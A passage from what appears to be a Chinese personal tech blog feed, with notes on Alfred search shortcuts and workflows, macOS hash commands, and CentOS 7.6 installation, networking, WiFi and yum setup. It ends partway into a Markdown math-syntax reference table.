<li>简书搜索：<code>alfred://customsearch/Search%20Jianshu%20for%20%27%7Bquery%7D%27/js/utf8/nospace/https%3A%2F%2Fwww.jianshu.com%2Fsearch%3Futf8%3D%25E2%259C%2593%26q%3D%7Bquery%7D</code></li>
<li>微信文章：<code>alfred://customsearch/Search%20Weixin%20for%20%27%7Bquery%7D%27/gzh/utf8/nospace/https%3A%2F%2Fweixin.sogou.com%2Fweixin%3Ftype%3D2%26query%3D%7Bquery%7D</code></li>
<li>知乎内容：<code>alfred://customsearch/Search%20Zhihu%20for%20%27%7Bquery%7D%27/zh/utf8/nospace/https%3A%2F%2Fwww.zhihu.com%2Fsearch%3Ftype%3Dcontent%26q%3D%7Bquery%7D</code></li>
<li>苹果文档：<code>alfred://customsearch/Search%20%EF%A3%BFDeveloper%20for%20%27%7Bquery%7D%27/ad/utf8/nospace/https%3A%2F%2Fdeveloper.apple.com%2Fsearch%2F%3Fq%3D%7Bquery%7D</code></li>
<li>淘宝搜索：<code>alfred://customsearch/Search%20Taobao%20for%20%27%7Bquery%7D%27/tb/utf8/nospace/https%3A%2F%2Fs.taobao.com%2Fsearch%3Foe%3Dutf-8%26f%3D8%26q%3D%7Bquery%7D</code></li>
<li>京东搜索：<code>alfred://customsearch/Search%20JD%20for%20%27%7Bquery%7D%27/jd/utf8/nospace/https%3A%2F%2Fsearch.jd.com%2FSearch%3Fenc%3Dutf-8%26keyword%3D%7Bquery%7D</code></li>
<li>GitHub：<code>alfred://customsearch/Search%20Github%20for%20%27%7Bquery%7D%27/sh/utf8/nospace/https%3A%2F%2Fgithub.com%2Fsearch%3Futf8%3D%25E2%259C%2593%26q%3D%7Bquery%7D</code></li>
<li>StackOverflow：<code>alfred://customsearch/Search%20StackOverflow%20for%20%27%7Bquery%7D%27/so/utf8/nospace/https%3A%2F%2Fwww.stackoverflow.com%2Fsearch%3Fq%3D%7Bquery%7D</code></li>
</ul>
<h3 id="Workflows（工作流）"><a href="#Workflows（工作流）" class="headerlink" title="Workflows（工作流）"></a>Workflows（工作流）</h3><p><img src="https://github.com/iHTCboy/iGallery/raw/master/BlogImages/2020/02/Alfred-Workflows.png" alt="Alfred-Workflows.png"></p>
<p><code>Workflows</code> 翻译中文为<strong>工作流</strong>，应该也比较好理解。刚才上面介绍的功能，有一部分就是工作流，可以理解为Alfred自带的工作流。类似的，你是不是能想到一些可以定制化的操作流程呢？所以，当然也可以使用第三方的工作流，或者自己定义自己的工作流！</p>
<p>如果想要使用第三方的或者自定义的工作流，需要支付购买Alfred的<code>PowerPack</code>（动力组），Alfred的 PowerPack 是最值得购买的服务，没有之一。因为如果使用 Alfred 而没有 PowerPack 授权，那 Alfred 的强大的功能相当失去了左右臂。关于 PowerPack 细节我们在下一节内容在讨论，我们接着说 Workflows（工作流）。</p>
<p>Alfred 安装完「Powerpack」，就像车体安装了引擎，余下的事情就看我们如何 DIY，让引擎为我们提供无限动力。而引擎提供动力的燃料我们称其为 <code>Workflow</code>。官方对于 workflow 是这样描述的：</p>
<blockquote>
<p>With Alfred’s Powerpack and workflows, you can extend Alfred and get things done in your own way. Replace repetitive tasks with workflows, and boost your productivity.<br>Discover the abundance of workflows that integrate with your favourite Mac applications and web services, from social networks and note-taking apps to shopping and music services.<br>We’ve hand-picked a few of the best workflows here. You’ll find hundreds more on <a href="http://www.packal.org/">Packal</a>, a brilliant user-created repository for workflows, as well as on <a href="https://alfredforum.com/">Alfred Forum</a>, where you’ll also find help in creating your own workflows.<br>借助Alfred的Powerpack和工作流程，您可以扩展Alfred并以自己的方式完成工作。用工作流替换重复的任务，并提高工作效率。<br>发现丰富的工作流程，这些工作流程与您喜欢的Mac应用程序和Web服务集成在一起，从社交网络和记笔记应用程序到购物和音乐服务。<br>我们在这里手工挑选了一些最佳的工作流程。在 <a href="http://www.packal.org/">Packal</a>（一个出色的由用户创建上传的workflows的网站）上以及 <a href="https://alfredforum.com/">Alfred Forum</a>（您可以在其中找到有关创建自己的workflows的帮助）的更多信息。</p>
</blockquote>
<h4 id="认识-WORKFLOWS-结构"><a href="#认识-WORKFLOWS-结构" class="headerlink" title="认识 WORKFLOWS 结构"></a>认识 WORKFLOWS 结构</h4><p>实现 WorkFlows 的四个基本对象：<code>trigger</code>、<code>keyword</code>、<code>action</code>、<code>output</code>。Alfred 通过将这四个基本对象合理链接「Connect」，便能实现各种高级功能。而在 Alfred 的 Workflow 配置界面中，大体上可以将其分为三栏，trigger 和 keyword 都会触发后续行为，所以归到「原因」类；Action 是「过程」类，也是 workflow 的核心，它负责处理用户需求；而 output 是「结果」类，负责把 action 的结果以一定的形式传递给用户，可以是直接屏显，也可以是另存为文件，也可以是返回到最后一个程序的输入框中。总之这三个类别「四个对象」各司其职，最终可以完成较为复杂的数据处理和用户需求。而这四个对象都可以用「线」链接，来形成直接或间接的条件结果关系。</p>
<p>本文主要是提高效率，所以关于如何自定义 Workflows（工作流）暂时不讲解，后面有需要在回来增加，原因 Workflow 创作的门槛比较低，类似iOS的 workflows，同时 workflow 支持的编程语言也非常多。可以参考现有的那些 Workflows（工作流），可以看到他们是怎么构建和流程的。另外，也可以参考我写过的 Workflows：<a href="https://ihtcboy.com/2019/11/17/2019-11-17_%E4%B8%80%E4%B8%AAAlfred%E7%9A%84Workflow%E8%81%8A%E5%A4%A9%E5%86%85%E5%AE%B9%E5%BC%95%E7%94%A8%E6%B6%88%E6%81%AF/">用 Alfred Workflow 实现聊天内容快速引用回复</a>，借鉴一些痛点，来实现自己的工作流！</p>
<p>下面会列出我现在使用的一些高效的 Workflows（工作流）插件，因为太多，所以就不全部都介绍，大家可以在这里看到我使用的全部 Alfred 相关的内容：<a href="https://github.com/iHTCboy/macOSConfig/tree/master/Alfred">macOSConfig&#x2F;Alfred - iHTCboy</a></p>
<h4 id="高效-WORKFLOWS-推荐"><a href="#高效-WORKFLOWS-推荐" class="headerlink" title="高效 WORKFLOWS 推荐"></a>高效 WORKFLOWS 推荐</h4><ul>
<li><strong>最近使用的文件&#x2F;应用等</strong></li>
</ul>
<p>教程：<a href="https://sspai.com/post/47063">妙用 Alfred 让你最近使用的文件触手可及</a><br>下载：<a href="https://github.com/mpco/AlfredWorkflow-Recent-Documents/releases">mpco&#x2F;AlfredWorkflow-Recent-Documents</a></p>
<ul>
<li><strong>Finder路径快速打开切换到终端（iTerm）的路径</strong><br>下载：<a href="http://www.packal.org/workflow/terminalfinder">TerminalFinder | Packal</a></li>
<li><strong>快速复制当前文件夹路径或者文件名字</strong><br>此插件来源：<a href="https://github.com/hzlzh/Alfred-Workflows">hzlzh&#x2F;Alfred-Workflows</a>，下面这个下载链接是博主改造后的，增加了文件名的复制，和使用最新的 Finder 图标。快捷复制当前Finder选择的文件(<code>cp</code>)的文件路径或文件名(<code>cpn</code>)。<br>下载：<a href="https://github.com/iHTCboy/macOSConfig/tree/master/Alfred">macOSConfig&#x2F;Alfred at master · iHTCboy&#x2F;macOSConfig</a></li>
<li><strong>Xcode 开发者清理 DerivedData 数据</strong><br>下载：<a href="https://github.com/ChopinChao/xcdd_workflow">ChopinChao&#x2F;xcdd_workflow: a simple xcdd workflow for Alfred2</a></li>
<li><strong>全局打开App（可自定义快捷键）</strong><br>教程：<a href="http://mac.bestswifter.com/mac-gong-zuo-liu/you-xiu-workflow-tui-jian.html">优秀 workflow 推荐 · GitBook</a><br>下载：<a href="https://github.com/bestswifter/my-workflow/blob/master/AppLauncher.alfredworkflow">my-workflow&#x2F;AppLauncher.alfredworkflow · bestswifter&#x2F;my-workflow</a></li>
<li><strong>Linux Command</strong><br>下载：<a href="https://github.com/jaywcjlove/linux-command">jaywcjlove&#x2F;linux-command: Linux命令大全搜索工具，内容包含Linux命令手册、详解、学习、搜集。https://git.io/linux</a></li>
<li><strong>Encode &#x2F; Decode</strong><br>下载：<a href="https://github.com/willfarrell/alfred-encode-decode-workflow">willfarrell&#x2F;alfred-encode-decode-workflow: Encoding and decoding a sting into multiple variations.</a></li>
<li><strong>快速调整图片尺寸</strong><br>下载：<a href="http://www.packal.org/workflow/resize-image">Resize Image | Packal</a></li>
<li><strong>配合 TinyPNG 快速压缩图片</strong><br>教程：<a href="https://evolly.one/2019/04/12/77-alfred-gallery/">alfred 使用 workflows 快速进行图片压缩</a><br>下载：[alfred-gallery&#x2F;image Compressor.alfredworkflow - BlackwinMin&#x2F;alfred-gallery](<a href="https://github.com/BlackwinMin/alfred-gallery/blob/master/image">https://github.com/BlackwinMin/alfred-gallery/blob/master/image</a> Compressor&#x2F;image Compressor.alfredworkflow)</li>
<li><strong>取色值工具</strong><br>下载：<a href="http://www.packal.org/workflow/colors">Colors | Packal</a></li>
<li><strong>快速在当前 Finder 窗口创建新文件</strong><br>下载：<a href="http://www.packal.org/workflow/newfile">NewFile | Packal</a></li>
<li><strong>Chrome History</strong><br>Chrome History 以及 Chrome Bookmarks 可以用于搜索 Chrome 的收藏书签和历史记录（支持模糊搜索）。<br>下载：<a href="https://github.com/tupton/alfred-chrome-history">tupton&#x2F;alfred-chrome-history: Search your Google Chrome history in Alfred</a></li>
<li><strong>从谷歌浏览器打开URL</strong><br>下载：<a href="https://www.packal.org/workflow/alfred-chrome">Alfred Chrome | Packal</a></li>
<li><strong>有道翻译</strong><br>下载：<a href="https://github.com/kaiye/workflows-youdao/">kaiye&#x2F;workflows-youdao: 学英语和写工具</a></li>
<li><strong>谷歌翻译</strong><br>下载：<a href="https://github.com/xfslove/alfred-google-translate">xfslove&#x2F;alfred-google-translate: Alfred 3 workflow - translate with google api💵🚫</a></li>
<li><strong>聊天内容快速引用回复</strong><br>教程：<a href="https://ihtcboy.com/2019/11/17/2019-11-17_%E4%B8%80%E4%B8%AAAlfred%E7%9A%84Workflow%E8%81%8A%E5%A4%A9%E5%86%85%E5%AE%B9%E5%BC%95%E7%94%A8%E6%B6%88%E6%81%AF/">用 Alfred Workflow 实现聊天内容快速引用回复</a><br>下载：[macOSConfig&#x2F;Reply Message v1.0.alfredworkflow at master · iHTCboy&#x2F;macOSConfig](<a href="https://github.com/iHTCboy/macOSConfig/blob/master/Alfred/Reply">https://github.com/iHTCboy/macOSConfig/blob/master/Alfred/Reply</a> Message v1.0.alfredworkflow)</li>
<li><strong>Evernote</strong><br>支持印象笔记的全局搜索。这功能很好很强大，能够帮助自己快速定位到具体的印象笔记的条目之上。<br>下载：<a href="https://www.alfredforum.com/topic/840-evernote-workflow-9-beta-4-alfred-4/">Evernote Workflow 9 beta 4 (Alfred 4) - Share your Workflows - Alfred App Community Forum</a></li>
<li><strong>货币转换</strong><br>下载：<a href="http://www.packal.org/workflow/currency-exchange">Currency Exchange | Packal</a></li>
<li><strong>Dash</strong><br>代码 Doc 文档全局快速搜索。<br>教程：<a href="https://www.alfredapp.com/blog/productivity/dash-quicker-api-documentation-search/">Dash: Quicker API Documentation Browsing - Alfred Blog</a></li>
<li><strong>世界主要城市时区查询</strong><br>下载：<a href="http://www.packal.org/workflow/timezones">TimeZones | Packal</a></li>
</ul>
<p>这些工作流还有很多，大家可以发挥自己的需求自定制。另外，还有非常多没有推荐的，可以参考文末的 workflows 链接大全。</p>
<h4 id="更多-WORKFLOWS-资源"><a href="#更多-WORKFLOWS-资源" class="headerlink" title="更多 WORKFLOWS 资源"></a>更多 WORKFLOWS 资源</h4><ul>
<li><a href="https://www.alfredapp.com/workflows/">Workflows 官方站点</a><br>官方推荐的「装机必备」系列 Workflows。</li>
<li><a href="http://www.packal.org/">Packal</a><br>官方推荐的 Workflows 分享站点。</li>
<li><a href="http://www.alfredworkflow.com/">Workflows 中文站</a><br>国人收藏的超多 Workflows.</li>
<li><a href="https://github.com/zenorocha/alfred-workflows">zenorocha&#x2F;alfred-workflows: A collection of Alfred 3 and 4 workflows that will rock your world</a><br>这个 Github 上维护的 workflows 很赞！汇总了开发用的 workflows。</li>
<li><a href="http://www.alfredforum.com/">Alfred 论坛</a><br>个人开发者开发的解决比较特别的问题的插件居多。</li>
</ul>
<p>Dash for mac 是一款功能强大的API文档浏览器和代码片段管理器，内置了丰富的API文档，多达150多种，可以在线下载各种开发API和文档资料，可以让您集中管理API文档，包括离线下载、搜索、查阅，包括各种主流的编程语言和框架，如Cocos2D, Cocos3D, Corona, CSS, HTML, Java, Objective-C, JavaScript, jQuery, Vue,React等, 不需要在到处下载 API 文档，Dash 已经自动集成了，并支持集成到Webstrom、Xcode、Alfred等软件中，非常的强大！开发者必备的API文档参考工具。</p>
<p>官网介绍</p>
<p>Dash gives your Mac instant offline access to 200+ API documentation sets.</p>
<p>Dash使您的Mac能够即时脱机访问200多个API文档集。</p>
<p>可以用命令$ curl <a href="http://link.zhihu.com/?target=http://cip.cc">cip.cc</a> 检查终端是否处于代理状态。</p>
<h1 id="MacOS命令行计算文件hash值"><a href="#MacOS命令行计算文件hash值" class="headerlink" title="MacOS命令行计算文件hash值"></a>MacOS命令行计算文件hash值</h1><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">openssl dgst -md5 <span class="number">123</span>.<span class="keyword">bin</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">or</span></span><br><span class="line"><span class="keyword"></span>openssl md5 <span class="number">123</span>.<span class="keyword">bin</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">or</span></span><br><span class="line"><span class="keyword"></span>md5 <span class="number">123</span>.<span class="keyword">bin</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">or</span></span><br><span class="line"><span class="keyword"></span>md5 -s <span class="string">&quot;text&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="SHA1"><a href="#SHA1" class="headerlink" title="SHA1"></a>SHA1</h2><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">openssl dgst -<span class="keyword">sha1 </span><span class="number">123</span>.<span class="keyword">bin</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">or</span></span><br><span class="line"><span class="keyword"></span>openssl <span class="keyword">sha1 </span><span class="number">123</span>.<span class="keyword">bin</span></span><br></pre></td></tr></table></figure>

<h2 id="HmacMD5"><a href="#HmacMD5" class="headerlink" title="HmacMD5"></a>HmacMD5</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">openssl md5 -hmac <span class="string">&quot;replace_hmac_key_string_here&quot;</span> <span class="number">123.</span><span class="built_in">bin</span></span><br></pre></td></tr></table></figure>

<h2 id="sha256"><a href="#sha256" class="headerlink" title="sha256"></a>sha256</h2><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">openssl <span class="keyword">sha256 </span>filename</span><br></pre></td></tr></table></figure>



<h1 id="Linux-centos关机命令"><a href="#Linux-centos关机命令" class="headerlink" title="Linux centos关机命令"></a>Linux centos关机命令</h1><ul>
<li>halt 立刻关机</li>
<li>poweroff 立刻关机</li>
<li>shutdown -h now 立刻关机(root用户使用)</li>
<li>shutdown -h 10 10分钟后自动关机</li>
</ul>
<h1 id="Pd-安装centos7-6-DVD"><a href="#Pd-安装centos7-6-DVD" class="headerlink" title="Pd 安装centos7.6-DVD"></a>Pd 安装centos7.6-DVD</h1><p>centos7.6 镜像：<a href="https://vault.centos.org/7.6.1810/isos/x86_64/#">https://vault.centos.org/7.6.1810/isos/x86_64/#</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202221526178.png" alt="image-20220222152645143"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202221527685.png" alt="image-20220222152732652"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202221530958.png" alt="image-20220222153030922"></p>
<h2 id="配置网络"><a href="#配置网络" class="headerlink" title="配置网络"></a>配置网络</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">保证是如下的值（没有的key可以新增，已有的key需要确保是以下值，部分值必须按自己的情况修改）如IPADDR/NETMASK/GATEWAY/DNS1）</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">共享模式</span> </span><br><span class="line">ONBOOT=yes</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">IPADDR=10.211.55.100</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">GATEWAY=10.211.55.1</span><br><span class="line">DNS1=10.211.55.1</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">桥接模式</span></span><br><span class="line">ONBOOT=yes</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">IPADDR=192.168.8.200</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">GATEWAY=192.168.8.1</span><br><span class="line">DNS1=8.8.8.8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">systemctl restart network.service</span><br><span class="line">systemctl disable firewalld</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">实际开发中不能关闭防火墙，而是开启某几个端口</span></span><br><span class="line">firewall-cmd --zone=public --add-port=4789/udp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>

<h2 id="更新yum源"><a href="#更新yum源" class="headerlink" title="更新yum源"></a>更新yum源</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install wget</span><br><span class="line"><span class="meta"># </span><span class="language-bash">备份原来的yum源</span></span><br><span class="line">mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br><span class="line"><span class="meta"># </span><span class="language-bash">下载163yum源配置</span></span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo</span><br><span class="line"><span class="meta"># </span><span class="language-bash">清空yum缓存</span></span><br><span class="line">yum clean all</span><br><span class="line"><span class="meta"># </span><span class="language-bash">生成缓存</span></span><br><span class="line">yum makecache</span><br></pre></td></tr></table></figure>



<h1 id="制作linux系统U盘并使用U盘安装CentOS7-6系统"><a href="#制作linux系统U盘并使用U盘安装CentOS7-6系统" class="headerlink" title="制作linux系统U盘并使用U盘安装CentOS7.6系统"></a>制作linux系统U盘并使用U盘安装CentOS7.6系统</h1><h2 id="制作linux启动盘"><a href="#制作linux启动盘" class="headerlink" title="制作linux启动盘"></a>制作linux启动盘</h2><p> 使用光盘刻录软件将系统镜像刻录到U盘后使用U盘安装系统。</p>
<ul>
<li><strong>准备</strong></li>
</ul>
<p> 1个大于8GU盘（最小1G以上，最好8G）</p>
<p> 官方系统镜像（CentOS7-1810）</p>
<p> 光盘刻录软件（UltraISO）</p>
<ul>
<li><strong>制作linux系统优盘</strong></li>
</ul>
<ol>
<li>打开UltraISO软件，选择 “文件” -&gt; “打开” 选择linux系统镜像（iso文件）并 “打开”。</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202222008059.png" alt="img"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202222009963.png" alt="img"></p>
<ol start="2">
<li>插入U盘，选择 “启动” -&gt; “写入硬盘镜像”，硬盘驱动器选择做为系统盘的U盘，其他选项不需要改动。</li>
</ol>
<p> <img src="https://www.w3xue.com/files/a20191/20190115092710856.png" alt="img"></p>
<ol start="3">
<li>点击 ”写入” ，等待刻录完成即可。</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202222009499.png" alt="img"></p>
<h2 id="使用U盘安装CentOS7-6系统"><a href="#使用U盘安装CentOS7-6系统" class="headerlink" title="使用U盘安装CentOS7.6系统"></a>使用U盘安装CentOS7.6系统</h2><ol>
<li><p>插入刚刚制作的系统U盘进入BIOS（惠普进入bios的方式是不停点击esc），更改U盘为第一启动项。  f10保存并重启。</p>
</li>
<li><p>进入centos安装界面，按TAB键进入配置编辑（根据提示，uefi是按e键）</p>
</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202222011906.png" alt="img"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202222011608.png" alt="img"></p>
<p>将配置改为vmlinuz initrd&#x3D;initrd.img inst.stage2&#x3D;hd……quiet改为vmlinuz initrd&#x3D;initrd.img linux dd quiet。修改之后回车系统会进入磁盘设备列表，查看U盘的设备名。</p>
<p><img src="https://www.w3xue.com/files/a20191/20190115092711667.png" alt="img"></p>
<p>记住设备名（sdb4），然后重启，进入安装界面，按TAB编辑配置，改为vmlinuz initrd&#x3D;initrd.img inst.stage2&#x3D;hd:&#x2F;dev&#x2F;sdb4 quiet</p>
<p> sdb4对应你的U盘的设备名，然后按回车进入图形安装界面。</p>
<ol start="3">
<li>进入图形界面如果不出现报错就是成功了，可以正常安装操作系统了。</li>
</ol>
<ul>
<li><p>选择语言</p>
</li>
<li><p>选择时区（Asia&#x2F;Shanghai）</p>
</li>
<li><p>选择软件包</p>
</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202222013832.png" alt="img"></p>
<ul>
<li>磁盘分区</li>
</ul>
<p>注意要选磁盘，不要选u盘</p>
<ol start="4">
<li>安装之后重启后关机移除U盘在开机即可正常使用。</li>
</ol>
<p><img src="https://www.w3xue.com/files/a20191/20190115092712806.png" alt="img"></p>
<h2 id="连接WIFI及配置合盖不断网"><a href="#连接WIFI及配置合盖不断网" class="headerlink" title="连接WIFI及配置合盖不断网"></a>连接WIFI及配置合盖不断网</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpa_passphrase &quot;Ziroom-702_5G&quot; &quot;4001001111&quot; &gt; /etc/wpa_supplicant/Ziroom-702_5G.conf</span><br><span class="line"></span><br><span class="line">vi /root/autostart/.sh</span><br><span class="line"><span class="meta"># </span><span class="language-bash">wlo1 为wifi网卡</span></span><br><span class="line">wpa_supplicant -B -i wlo1 -c /etc/wpa_supplicant/Ziroom-702_5G.conf</span><br><span class="line"></span><br><span class="line">dhclient wlo1</span><br><span class="line"></span><br><span class="line">chmod +x /root/autostart.sh</span><br><span class="line"></span><br><span class="line">touch /etc/rc.local</span><br><span class="line">chmod +x /etc/rc.local</span><br><span class="line">vi /etc/rc.local</span><br><span class="line"><span class="meta"># </span><span class="language-bash">在最后一行加入autostart.sh的路径</span></span><br><span class="line">/root/autostart.sh</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">笔记本合住不断网配置</span></span><br><span class="line">vi /etc/systemd/logind.conf</span><br><span class="line"></span><br><span class="line">HandleLidSwitch=lock  </span><br><span class="line"></span><br><span class="line">systemctl restart systemd-logind</span><br></pre></td></tr></table></figure>



<h2 id="yum安装的软件undo"><a href="#yum安装的软件undo" class="headerlink" title="yum安装的软件undo"></a>yum安装的软件undo</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">Get all yum commands previously run</span></span><br><span class="line">yum history list all</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Get the details of the <span class="built_in">command</span></span></span><br><span class="line">yum history info [entry number]</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Undo each <span class="built_in">command</span> top-down</span></span><br><span class="line">yum history undo [entry number]</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>Markdown 教程</title>
    <url>/2021/12/21/Chaos/Markdown/</url>
    <content><![CDATA[<h1 id="Markdown-教程"><a href="#Markdown-教程" class="headerlink" title="Markdown 教程"></a>Markdown 教程</h1><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211234999.png" alt="img"></p>
<p>Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档。</p>
<p>Markdown 语言在 2004 由约翰·格鲁伯（英语：John Gruber）创建。</p>
<p>Markdown 编写的文档可以导出 HTML 、Word、图像、PDF、Epub 等多种格式的文档。</p>
<p>Markdown 编写的文档后缀为 <strong>.md</strong>, <strong>.markdown</strong>。</p>
<h2 id="Markdown-数学公式"><a href="#Markdown-数学公式" class="headerlink" title="Markdown 数学公式"></a>Markdown 数学公式</h2><h2 id="上-x2F-下标"><a href="#上-x2F-下标" class="headerlink" title="上&#x2F;下标"></a><strong>上&#x2F;下标</strong></h2><table>
<thead>
<tr>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$x^2 $</td>
<td>x^2</td>
</tr>
<tr>
<td>$y_1 $</td>
<td>y_1</td>
</tr>
</tbody></table>
<h2 id="分式"><a href="#分式" class="headerlink" title="分式"></a><strong>分式</strong></h2><table>
<thead>
<tr>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>1&#x2F;2</td>
<td>1&#x2F;2</td>
</tr>
<tr>
<td>$\frac{1}{2}$</td>
<td>\frac{1}{2}</td>
</tr>
</tbody></table>
<h2 id="省略号"><a href="#省略号" class="headerlink" title="省略号"></a><strong>省略号</strong></h2><table>
<thead>
<tr>
<th>省略号</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\cdots$</td>
<td>\cdots</td>
</tr>
</tbody></table>
<h2 id="开根号"><a href="#开根号" class="headerlink" title="开根号"></a><strong>开根号</strong></h2><table>
<thead>
<tr>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\sqrt{2}$</td>
<td>\sqrt{2}</td>
</tr>
</tbody></table>
<h2 id="矢量"><a href="#矢量" class="headerlink" title="矢量"></a><strong>矢量</strong></h2><table>
<thead>
<tr>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\vec{a}$</td>
<td>\vec{a}</td>
</tr>
</tbody></table>
<h2 id="积分"><a href="#积分" class="headerlink" title="积分"></a><strong>积分</strong></h2><table>
<thead>
<tr>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\int{x}dx$</td>
<td>\int{x}dx</td>
</tr>
<tr>
<td>$\int_{1}^{2}{x}dx$</td>
<td>\int_{1}^{2}{x}dx</td>
</tr>
</tbody></table>
<h2 id="极限"><a href="#极限" class="headerlink" title="极限"></a><strong>极限</strong></h2><table>
<thead>
<tr>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\lim{a+b}$</td>
<td>\lim{a+b}</td>
</tr>
<tr>
<td>$\lim_\limits{n\rightarrow+\infty}$</td>
<td>\lim_{n\rightarrow+\infty}</td>
</tr>
</tbody></table>
<h2 id="累加"><a href="#累加" class="headerlink" title="累加"></a><strong>累加</strong></h2><table>
<thead>
<tr>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\sum{a}$</td>
<td>\sum{a}</td>
</tr>
<tr>
<td>$\sum_{n&#x3D;1}^{100}{a_n}$</td>
<td>\sum_{n&#x3D;1}^{100}{a_n}</td>
</tr>
</tbody></table>
<h2 id="累乘"><a href="#累乘" class="headerlink" title="累乘"></a><strong>累乘</strong></h2><table>
<thead>
<tr>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$\prod{x}$</td>
<td>\prod{x}</td>
</tr>
<tr>
<td>$\prod_{n&#x3D;1}^{99}{x_n}$</td>
<td>\prod_{n&#x3D;1}^{99}{x_n}</td>
</tr>
</tbody></table>
<h2 id="希腊字母"><a href="#希腊字母" class="headerlink" title="希腊字母"></a><strong>希腊字母</strong></h2><table>
<thead>
<tr>
<th>大写</th>
<th>Markdown</th>
<th>小写</th>
<th>Markdown</th>
</tr>
</thead>
<tbody><tr>
<td>$A$</td>
<td>A</td>
<td>$\alpha$</td>
<td>\alpha</td>
</tr>
<tr>
<td>$B$</td>
<td>B</td>
<td>$\beta$</td>
<td>\beta</td>
</tr>
<tr>
<td>$\Gamma$</td>
<td>\Gamma</td>
<td>$\gamma$</td>
<td>\gamma</td>
</tr>
<tr>
<td>$\Delta$</td>
<td>\Delta</td>
<td>$\delta$</td>
<td>\delta</td>
</tr>
<tr>
<td>$E$</td>
<td>E</td>
<td>$\epsilon$</td>
<td>\epsilon</td>
</tr>
<tr>
<td></td>
<td></td>
<td>$\varepsilon$</td>
<td>\varepsilon</td>
</tr>
<tr>
<td>$Z$</td>
<td>Z</td>
<td>$\zeta$</td>
<td>\zeta</td>
</tr>
<tr>
<td>$H$</td>
<td>H</td>
<td>$\eta$</td>
<td>\eta</td>
</tr>
<tr>
<td>$\Theta$</td>
<td>\Theta</td>
<td>$\theta$</td>
<td>\theta</td>
</tr>
<tr>
<td>$I$</td>
<td>I</td>
<td>$\iota$</td>
<td>\iota</td>
</tr>
<tr>
<td>$K$</td>
<td>K</td>
<td>$\kappa$</td>
<td>\kappa</td>
</tr>
<tr>
<td>$\Lambda$</td>
<td>\Lambda</td>
<td>$\lambda$</td>
<td>\lambda</td>
</tr>
<tr>
<td>$M$</td>
<td>M</td>
<td>$\mu$</td>
<td>\mu</td>
</tr>
<tr>
<td>$N$</td>
<td>N</td>
<td>$\nu$</td>
<td>\nu</td>
</tr>
<tr>
<td>$\Xi$</td>
<td>\Xi</td>
<td>$\xi$</td>
<td>\xi</td>
</tr>
<tr>
<td>$O$</td>
<td>O</td>
<td>$\omicron$</td>
<td>\omicron</td>
</tr>
<tr>
<td>$\Pi$</td>
<td>\Pi</td>
<td>$\pi$</td>
<td>\pi</td>
</tr>
<tr>
<td>$P$</td>
<td>P</td>
<td>$\rho$</td>
<td>\rho</td>
</tr>
<tr>
<td>$\Sigma$</td>
<td>\Sigma</td>
